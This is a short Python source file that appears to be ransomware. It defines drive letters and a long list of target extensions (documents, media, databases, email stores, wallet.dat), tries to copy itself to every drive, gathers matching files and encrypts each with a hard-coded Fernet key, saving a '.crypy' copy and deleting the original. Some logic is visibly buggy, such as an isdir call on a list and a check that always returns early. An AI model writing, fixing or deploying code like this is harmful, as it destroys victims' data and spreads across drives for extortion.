import shutil
import os
import sys
from cryptography.fernet import Fernet


drives = ['A:\\', 'B:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\','I:\\',
          'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\','Q:\\',
          'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\','Y:\\',
          'Z:\\']
f_name = []
targets = ('.txt', '.docx', '.doc', '.lnk', '.xlsx', '.pdf', '.zip', '.ppt',
           '.jpg', '.jpeg', 'gif', '.mp3', '.mp4', '.svg', '.ico', '.3gp',
           'ink', '.gz', '.rar', '.wav', '.iso', '.java', '.html', '.css',
           '.key', '.enc', '.png', 'wallet.dat', '.cvs', '.bak', '.xls', '.odt',
           '.rtf', '.tex', '.7z', '.deb', '.rmp', '.z', '.pkg',
           '.dmg', '.toast', '.db', '.dbf', '.log', '.mdb', '.sav', '.xml',
           '.xhtml', '.htm', '.email', '.eml', '.msg', '.ost', '.pst', '.vcf',
           '.jar', '.bat', '.cgi', '.msi', '.gadget', '.tiff', '.tif', '.ai',
           '.asp', '.aspx', '.odp', '.pptx', '.ods', '.rtx', '.avi', '.wmv')


def spread():
    name = sys.argv[0]
    path = os.getcwd()
    abspath = os.path.join(path, name)
    for drive in drives:
        if drive in os.path.isdir(drives):
            try:
                shutil.copyfile(abspath, drive)
            except Exception:
                pass
        else:
            pass


def find_shared_file():
    # Get files to encrypt from current user
    for drive in drives:
        if drive in drive:
            return drive
        for r, d, files in os.walk(drive):
            for file in files:
                if file.endswith(targets):
                    f_name.append(os.path.join(r, file))
                    print(f_name)
                    break


def encrypt_shared_file():
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
    for fn in f_name:
        k = key
        f = Fernet(k)
        try:
            with open(fn, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)
            with open(fn + '.crypy', "wb") as file:
                file.write(encrypted_data)
                print(file)
                os.remove(fn)
        except Exception:
            pass
